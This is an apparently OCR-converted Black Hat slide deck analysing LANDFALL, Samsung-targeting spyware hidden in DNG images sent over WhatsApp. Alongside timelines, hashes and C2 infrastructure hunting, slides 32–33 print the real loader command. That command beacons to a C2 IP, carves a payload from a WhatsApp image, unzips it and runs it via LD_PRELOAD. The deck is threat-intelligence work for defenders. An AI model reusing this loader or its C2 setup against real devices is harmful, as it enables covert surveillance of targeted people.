---
title: "Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware"
speakers: ["Itay Cohen (Megabeets)"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Itay Cohen (Megabeets)_Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware.pdf"
pages: 54
sha256: "bec38d4f3a8163608f57693fcda6e3990cdf0c5d26dac962c3c55ff38cb67168"
text_chars: 12847
ocr_pages: 10
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.7
ocr_unreliable_blocks: 0
vision_verified_blocks: 6
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:35:34Z"
---
# Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware

**Speakers:** Itay Cohen (Megabeets)  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Itay Cohen (Megabeets)_Hunting LANDFALL From Overlooked Images to State-Linked Mobile Spyware.pdf` (54 pages)


## Slide 1

# LANDFALL*

from overlooked images to state-linked mobile **spyware** .

Black Hat USA 2026

## Slide 2

FINDING WHAT WE DIDN’T SEARCH FOR*

## Slide 3

I am a **Senior Principal Researcher** at the research and analysis division of **Palo Alto Networks** . As part of my work in the threat intel teams of **Unit 42** , I work across malware analysis, threat intel, **reverse engineering** . I try to turn complex technical findings into clear stories, useful tools, and public research that helps defenders. I am an **Animal Liberation Activist** and care deeply about animal liberation. I also maintain open-source reverse engineering projects such as Rizin and Cutter, and was selected for **Forbes 30 under 30** for my threat research and activism.

ITAY COHEN

## Slide 4

###### Hunting from almost nothing

Turning evasion into signal

## Slide 5

AUGUST 2025

## Slide 6

**Apple Patches CVE-2025-43300** **Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks**


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The Hacker News
Apple Patches CVE-2025-43300 Zero-Day in iOS,
iPadOS, and macOS Exploited in Targeted Attacks
WhatsApp Zero-Day Exploited in
Attacks Targeting Apple Users
The vulnerability (CVE-2025-55177) was exploited along an iOS/macOS
zero-day in suspected spyware attacks.
```

## Slide 7

**Apple Patches CVE-2025-43300** **Zero-Day in iOS, iPadOS, and macOS Exploited in Targeted Attacks No IoCs, no public samples**

## Slide 8

**CVE-2025-43300** is a critical memory corruption vulnerability in Apple's image processing framework that affects iOS and macOS systems. The vulnerability exists in the decompression code within RawCamera.bundle, triggered by inconsistencies between TIFF metadata and JPEG stream parameters in **DNG files** .

## Slide 9

**D** IGITAL **N** E **G** ATIVE

TIFF-based image file format

## Slide 10

## **D** IGITAL

**N** E **G** ATIVE **OPCODES**

**3 Opcode Lists**

**Designed for things like lens correction Turing Complete**

## Slide 11


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Matches - 6/~6 Files (i)                                                              First seen

9297888746158e38d320b05b27b0032b2cc29231be8990d87bc46f1e06456f93
  WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg                                        2025-02-10
  tiff                                                                                13:56:53

b975b499baa3119ac5c2b3379306d4e50b9610e9bba3e56de7dfd3927a96032d
  390a4964-68ad-4bdd-9f63-4a8ec371596a.jpeg                                           2024-08-27
  tiff                                                                                21:26:55

c0f30c2a2d6f95b57128e78dc0b7180e69315057e62809de1926b75f86516b2e
  WhatsApp Image 2024-08-27 at 11.48.40 AM.jpeg                                       2024-08-27
  tiff                                                                                09:39:53

b06dec10e8ad0005ebb9da24204c96cb2e297bd8d418bc1c8983d066c0997756
  IMG-20250120-WA0005.jpg                                                             2025-01-20
  tiff                                                                                14:37:04

b45817ffb0355badcc89f2d7d48eecf00ebdf2b966ac986514f9d971f6c57d18
  IMG-20240723-WA0000.jpg                                                             2024-07-23
  tiff                                                                                10:08:54

29882a3c426273a7302e852aa77662e168b6d44dcebfca53757e29a9cdf02483
  IMG-20240723-WA0001.jpg                                                             2024-07-23
  tiff                                                                                10:05:57
```

## Slide 12


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 69/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Matches - 6/~6 Files (i)                                                              First seen

9297888746158e38d320b05b27b0032b2cc29231be8990d87bc46f1e06456f93
  WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg                                        2025-02-10
  tiff                                                                                13:56:53

b975b499baa3119ac5c2b3379306d4e50b9610e9bba3e56de7dfd3927a96032d
  390a4964-68ad-4bdd-9f63-4a8ec371596a.jpeg                                           2024-08-27
  tiff                                                                                21:26:55

c0f30c2a2d6f95b57128e78dc0b7180e69315057e62809de1926b75f86516b2e
  WhatsApp Image 2024-08-27 at 11.48.40 AM.jpeg                                       2024-08-27
  tiff                                                                                09:39:53

b06dec10e8ad0005ebb9da24204c96cb2e297bd8d418bc1c8983d066c0997756
  IMG-20250120-WA0005.jpg                                                             2025-01-20
  tiff                                                                                14:37:04

b45817ffb0355badcc89f2d7d48eecf00ebdf2b966ac986514f9d971f6c57d18
  IMG-20240723-WA0000.jpg                                                             2024-07-23
  tiff                                                                                10:08:54

29882a3c426273a7302e852aa77662e168b6d44dcebfca53757e29a9cdf02483
  IMG-20240723-WA0001.jpg                                                             2024-07-23
  tiff                                                                                10:05:57

[The "First seen" column is highlighted with a yellow box and a hand-drawn yellow arrow pointing to it; the rest of the panel is dimmed.]
```

## Slide 13

|Iran
**Uploaded from**|
|---|
|Iraq|
|Turkey|
|Morocco
. . .
.|


> Recovered by OCR — confidence 85/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Uploaded from
Image 2025-02-10 at 4.54.17 PM.jpeg
9ac5c2b3379306d4e50b9610e9bba3e56de7d fd3927a96032d
68ad-4bdd-9F63-4a8ec371596a. jpeg
Image 2024-08-27 at 11.48.40 AM. jpeg
0723-WAQ000. jpg
```

## Slide 14

WhatsApp

WhatsApp

WA

WA


> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Matches - 6/~6 Files @
9297888746158e38d320b05b27b0032b2cc29231be8990d87H
© WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg
© WhatsApp Image 2024-08-27 at 11.48.40 AM.jpeg
© IMG-20240723-WA0000. jpg
```

## Slide 15

###### Legitimate TIFF header

Timestamp

## Slide 16

## Slide 17

data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .ipservice/files/ **b.so**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 85/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
005A7210:  33 05 00 84 33 05 00 27   00 00 00 00 00 00 00 00  3...3..'........
005A7220:  00 00 00 A4 81 00 00 00   00 64 61 74 61 2F 64 61  .........data/da
005A7230:  74 61 2F 63 6F 6D 2E 73   61 6D 73 75 6E 67 2E 69  ta/com.samsung.i
005A7240:  70 73 65 72 76 69 63 65   2F 66 69 6C 65 73 2F 6C  pservice/files/l
005A7250:  50 4B 01 02 14 03 14 00   00 00 08 00 EF 2E F7 58  PK.............X
005A7260:  DB 94 54 E8 A1 BD 00 00   40 9D 01 00 2A 00 00 00  ..T.....@...*...
005A7270:  00 00 00 00 00 00 00 00   80 81 32 34 05 00 64 61  ..........24..da
005A7280:  74 61 2F 64 61 74 61 2F   63 6F 6D 2E 73 61 6D 73  ta/data/com.sams
005A7290:  75 6E 67 2E 69 70 73 65   72 76 69 63 65 2F 66 69  ung.ipservice/fi
005A72A0:  6C 65 73 2F 62 2E 73 6F   50 4B 05 06 00 00 00 00  les/b.soPK......
005A72B0:  02 00 02 00 AD 00 00 00   1B F2 05 00 00 00        ..............

data/data/com.samsung.ipservice/files/l

data/data/com.samsung.ipservice/files/b.so
```

## Slide 18

wait - Samsung?

## Slide 19

! Yes, Samsung

$ **file** b.so .l

**b.so** : ELF 64-bit LSB shared object, **ARM aarch64 l** : **XZ** compressed data (ELF 64-bit, too)

## Slide 20

EXPECTATIONS…

REALITY…. Hello,
Android!

## Slide 21

###### **THE FLOW**

**com.samsung.ipservice** powers intelligent features like AI tagging by **periodically scanning Android's MediaStore** .

**WhatsApp** **downloads** media there.

## Slide 22

###### **THE FLOW**

**com.samsung.ipservice** powers intelligent features like AI tagging by **periodically scanning Android's MediaStore** .

**WhatsApp** **downloads** media there.

###### **01 / RECEIVE**

###### **02 / INDEX**

###### **03 / EXPOSE**

**WhatsApp App** WhatsApp receives and downloads an image file, saving it to the device storage.

**Android OS** The downloaded image is inserted into Android's system-wide MediaStore.

**samsung.ipservice** The background service scans the MediaStore, parses the image and expose the system to attack.

## Slide 23

libimagecodec. quram. so

## Slide 24

Code which processes **untrustworthy inputs** DO NOT! Code Code written which in an runs with **unsafe no language sandbox** GOOGLE’s RULE OF 2

## Slide 25

CVE-2025 -21042

## Slide 26

##### TIMELINE

First malicious DNG image file appears on VirusTotal

July, 2024

## Slide 27

##### TIMELINE

First malicious DNG image file appears on VirusTotal

Sept 25, 2024

Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

## Slide 28

##### TIMELINE

First malicious DNG image file appears on VirusTotal

Sept 25, 2024

Samsung issues firmware update to address vulnerability that would become CVE-2025-21042

Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

April, 2025

## Slide 29

##### TIMELINE

First malicious DNG image file appears on VirusTotal Sept 25, 2024 Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

Samsung issues firmware update to address vulnerability that would become CVE-2025-21042 August, 2025 ● Apple patches DNG vulnerability April, 2025 ● WhatsApp discloses chained exploit ● WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**

## Slide 30

##### TIMELINE

First malicious DNG image file appears on VirusTotal

Sept 25, 2024

Samsung issues firmware update to address vulnerability that would become CVE-2025-21042

August, 2025

Samsung issues firmware update to address CVE-2025-21043 and discloses CVE-2025-21042

Vulnerability that July, 2024 would become **CVE-2025-21042** was privately reported to Samsung

- Apple patches DNG vulnerability

- April, 2025 Sept, 2025 ● WhatsApp discloses chained exploit

- ● WhatsApp notifies Samsung of another vuln — **CVE-2025-21043**

## Slide 31

**projectzero.google** /2025/12/android-itw-dng.html

## Slide 32

**/system/bin/sh -c 'ping -c 1 -w1 -p 2066c1d8ce2834f1fbb1296f9dca73419 91.132.92.35 >/dev/null & '; pid=`cat /proc/self/stat | cut -F 4` && ppid=`cat /proc/$pid/stat | cut -F 4`; rm -f /data/data/com.samsung.ipservice/files/b.so;**

**rm -f /data/data/com.samsung.ipservice/files/z.zip; image=`find /storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/ /storage/emulated/95/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/**

**/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1000/Media/WhatsApp Images/ [...]**

**/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/accounts/1010/Media/WhatsApp Images/ -type f -atime -720m -maxdepth 1 -exec grep -lo '.*066c1d8ce2834f1fbb1296f9dca73419.*' {} \; -quit 2>/dev/null` ; /system/bin/sh -c 'ping -c 1 -w1 -p $(test "$image" && echo 31066c1d8ce2834f1fbb1296f9dca73419 || echo 30066c1d8ce2834f1fbb1296f9dca73419) 91.132.92.35 >/dev/null & ' ;**

**tail -c $(( 390245 )) "$image" > /data/data/com.samsung.ipservice/files/z.zip && unzip -o -d / /data/data/com.samsung.ipservice/files/z.zip && chmod +x /data/data/com.samsung.ipservice/files/b.so; R=I SEP=CAFEBABE LD_PRELOAD=/data/data/com.samsung.ipservice/files/b.so /system/bin/id; content write --uri "content://com.samsung.cmh/files?service_flag=update%20files SET serviceflag= serviceflag | 66304";**

**kill -9 $ppid**

## Slide 33

**/system/bin/sh -c 'ping -c 1 91.132.92.35 >/dev/null & '**

[...]

**rm -f** /data/data/com.samsung.ipservice/files/ **b.so**

**rm -f** /data/data/com.samsung.ipservice/files/ **z.zip** [...]

**find** /storage/emulated/0/Android/media / **com.whatsapp** / **WhatsApp/Media/WhatsApp Images** / [...]

**unzip -o -d** / /data/data/com.samsung.ipservice/files/ **z.zip chmod** +x /data/data/com.samsung.ipservice/files/ **b.so R** =I **SEP** = **CAFEBABE LD_PRELOAD** =/data/data/com.samsung.ipservice/files/ **b.so** /system/bin/id

## Slide 34

INSIDE LANDFALL*

## Slide 35

data/data/com. **samsung** .ipservice/files/ **l** data/data/com. **samsung** .ipservice/files/ **b.so**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 85/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
005A7210:  33 05 00 84 33 05 00 27   00 00 00 00 00 00 00 00  3...3..'........
005A7220:  00 00 00 A4 81 00 00 00   00 64 61 74 61 2F 64 61  .........data/da
005A7230:  74 61 2F 63 6F 6D 2E 73   61 6D 73 75 6E 67 2E 69  ta/com.samsung.i
005A7240:  70 73 65 72 76 69 63 65   2F 66 69 6C 65 73 2F 6C  pservice/files/l
005A7250:  50 4B 01 02 14 03 14 00   00 00 08 00 EF 2E F7 58  PK.............X
005A7260:  DB 94 54 E8 A1 BD 00 00   40 9D 01 00 2A 00 00 00  ..T.....@...*...
005A7270:  00 00 00 00 00 00 00 00   80 81 32 34 05 00 64 61  ..........24..da
005A7280:  74 61 2F 64 61 74 61 2F   63 6F 6D 2E 73 61 6D 73  ta/data/com.sams
005A7290:  75 6E 67 2E 69 70 73 65   72 76 69 63 65 2F 66 69  ung.ipservice/fi
005A72A0:  6C 65 73 2F 62 2E 73 6F   50 4B 05 06 00 00 00 00  les/b.soPK......
005A72B0:  02 00 02 00 AD 00 00 00   1B F2 05 00 00 00        ..............

data/data/com.samsung.ipservice/files/l

data/data/com.samsung.ipservice/files/b.so
```

## Slide 36


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 91/100 on the text kept, 92/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
00013920:  00 70 65 72 73 69 73 74   65 6E 63 79 5F 62 61  .persistency_ba
0001392F:  63 6B 75 70 00 70 65 72   73 69 73 74 65 6E 63  ckup.persistenc
0001393E:  79 5F 6F 72 69 67 69 6E   00 70 65 72 73 69 73  y_origin.persis
0001394D:  74 65 6E 63 79 5F 70 61   79 6C 6F 61 64 00 61  tency_payload.a
0001395C:  67 65 6E 74 5F 69 64 00   63 6F 6D 6D 61 6E 64  gent_id.command
0001396B:  5F 69 64 00 62 72 69 64   67 65 5F 68 65 61 64  _id.bridge_head
0001397A:  5F 76 65 72 73 69 6F 6E   5F 6D 69 6E 6F 72 00  _version_minor.
00013989:  62 72 69 64 67 65 5F 68   65 61 64 5F 76 65 72  bridge_head_ver
00013998:  73 69 6F 6E 5F 6D 61 6A   6F 72 00 70 75 62 6C  sion_major.publ
000139A7:  69 63 5F 6B 65 79 00 26   69 6E 63 72 65 6D 65  ic_key.&increme
000139B6:  6E 74 61 6C 5F 62 75 69   6C 64 3D 00 26 65 75  ntal_build=.&eu

[The bytes 62 72 69 64 67 65 5F 68 65 61 64 / "bridge_head" are highlighted in blue on row 0001396B and in green on row 00013989.]
```

## Slide 37

**BRIDGE HEAD**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
00013920:  00 70 65 72 73 69 73 74   65 6E 63 79 5F 62 61  .persistency_ba
0001392F:  63 6B 75 70 00 70 65 72   73 69 73 74 65 6E 63  ckup.persistenc
0001393E:  79 5F 6F 72 69 67 69 6E   00 70 65 72 73 69 73  y_origin.persis
0001394D:  74 65 6E 63 79 5F 70 61   79 6C 6F 61 64 00 61  tency_payload.a
0001395C:  67 65 6E 74 5F 69 64 00   63 6F 6D 6D 61 6E 64  gent_id.command
0001396B:  5F 69 64 00 62 72 69 64   67 65 5F 68 65 61 64  _id.bridge_head
0001397A:  5F 76 65 72 73 69 6F 6E   5F 6D 69 6E 6F 72 00  _version_minor.
00013989:  62 72 69 64 67 65 5F 68   65 61 64 5F 76 65 72  bridge_head_ver
00013998:  73 69 6F 6E 5F 6D 61 6A   6F 72 00 70 75 62 6C  sion_major.publ
000139A7:  69 63 5F 6B 65 79 00 26   69 6E 63 72 65 6D 65  ic_key.&increme
000139B6:  6E 74 61 6C 5F 62 75 69   6C 64 3D 00 26 65 75  ntal_build=.&eu

BRIDGE HEAD

[Same hex dump as the previous slide, dimmed, with a large yellow callout banner reading "BRIDGE HEAD" overlaid across rows 0001395C-0001397A. The bytes 62 72 69 64 67 65 5F 68 65 61 64 / "bridge_head" are highlighted in blue on row 0001396B and in green on row 00013989.]
```

## Slide 38

{

### CONFIGURATION

"cnc_hostname":  " **91.132.92.35** ",

"cnc_port":  22398,

"cnc_base_url":  "is/",

"agent_id":  "066c1d8c-e283-4f1f-bb12-96f9dca73419",

"command_id":  "4317c7e3-2898-4886-aa9c-935c0ac328fa",

"sleep_time":  1,

- "sepolicy_zipped_device_path":  "/data/data/com. **samsung** .ipservice/files/ **l** ", "sepolicy_device_path":  "/data/data/com. **samsung** .ipservice/files/ **l.so** ",

- "sepolicy_magic":  " **CAFEBABE** "

}

## Slide 39

### CAPABILITIES*

microphone recording location tracking browser database extraction

microphone recording calls recording & camera access interception location tracking SMS & contacts whatsapp images browser database applications images exfiltration extraction arbitrary file anti analysis read & write

## Slide 40

###### **C2 Addresses Extracted from LANDFALL Configs**

|C2 IP|Port|Agent ID|Cert|Valid|
|---|---|---|---|---|
|45.155.250[.]158|22387|176eb95f-5683-4228-8869-141a227b5aad|2024-04|→2025-04|
|92.243.65[.]240|22387|e47a0f01-54b4-407f-8263-8078748cf913|2024-07|→2025-07|
|46.246.28[.]75|22387|b8e5fa71-289d-408a-b2ad-60c4b090d653|2024-12|→2025-12|
|91.132.92[.]35|22398|066c1d8c-e283-4f1f-bb12-96f9dca73419|2025-01|→2026-01|

## Slide 41

###### **C2 Addresses Extracted from LANDFALL Configs**

C2 IP Port Agent ID Cert Valid
45.155.250[.]158 22387 176eb95f-5683-4228-8869-141a227b5aad 2024-04 → 2025-04
92.243.65[.]240 22387 Cluster e47a0f01-54b4-407f-8263-8078748cf913 A 2024-07 → 2025-07
46.246.28[.]75 22387 b8e5fa71-289d-408a-b2ad-60c4b090d653 2024-12 → 2025-12
91.132.92[.]35 22398 066c1d8c-e283-4f1f-bb12-96f9dca73419 2025-01 → 2026-01

## Slide 42

###### **Two Infrastructure Clusters**

||**Cluster A**|
|---|---|
|PORTS|22387, 22397, 22398, 5323, ~10900,
~24000|
|SERVER|Nginx (various versions)|
|TLS|Self-signed OpenSSL defaults|
|RESPONSE|404 / 405 / 500 as control signals|

## Slide 43

###### **Two Infrastructure Clusters**

**Cluster A** PORTS 22387, 22397, 22398, 5323, ~10900, ~24000 SERVER Nginx (various versions) TLS Self-signed OpenSSL defaults RESPONSE 404 / 405 / 500 as control signals

Those domains resolve to different servers — a **second layer** of infrastructure.

## Slide 44

###### **Two Infrastructure Clusters**

||**Cluster A**||**Cluster B**|
|---|---|---|---|
|PORTS
SERVER
TLS|22387, 22397, 22398, 5323, ~10900,
~24000
Nginx (various versions)
Self-signed OpenSSL defaults|PORTS
SERVER
TLS|443 (standard HTTPS)
Nginx 1.18.0 (Ubuntu)
Let's Encrypt certificates|
|RESPONSE|404 / 405 / 500 as control signals|COVER|WordPress sites w/ generic content|
|||REGISTRAR|Namecheap (all domains)|
|||NAMING|Multi-word English (2-3 words)|

## Slide 45

We observed **Windows** malware beaconing to **Cluster B** infrastructure for C2

communications

## Slide 46

ATTRIBUTION*

## Slide 47

**Stealth Falcon** TGR-UNK-1069

Targets governments, f i nancial institutions, and telecom organizations across the Middle East and North Africa.

## Slide 48

### Differential Analysis

## Slide 49

#### The Problem

###### **The Fingerprint**

Server nginx/1.18.0 (Ubuntu) Port 443 Certificate Let's Encrypt Content WordPress

How many servers on the internet match this description?

~ **2,000,000** Among the most common web server configuration on the internet. **Fingerprinting alone is useless** .

## Slide 50

##### The Discovery

||Scanner A|Scanner B|Scanner C|
|---|---|---|---|
|Known C2 #1|✗|✗|✓|
|Known C2 #2|✗|✗|✓|
|Known C2 #3|✗|✗|✓|
|...|✗|✗|✓|
|All 12 confirmed C2s|0/12|0/12|12/12|
|Legitimate Nginx servers|✓|✓|✓|

## Slide 51

#### Differential Scanner Analysis

The actor blocked Scanner A’s and B ‘s IP ranges on their C2 servers.
They missed Scanner C . That gap is the signal.
Step 1 Step 2 Step 3 Step 4 Step 5
Query Scanner C Query Scanner A Subtract Refine Validate

## Slide 52

If you have known C2 servers and they're absent from a scanner, that's **not** missing data. **That's signal** .

## Slide 53

hunting from nothing turning attacker’s opsec against them don’t just stick to one tool


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
% hunting from nothing
X& turning attacker’s opsec
A against them
X don’t just stick to one tool
```

## Slide 54

**@** megabeets_

THANK YOU
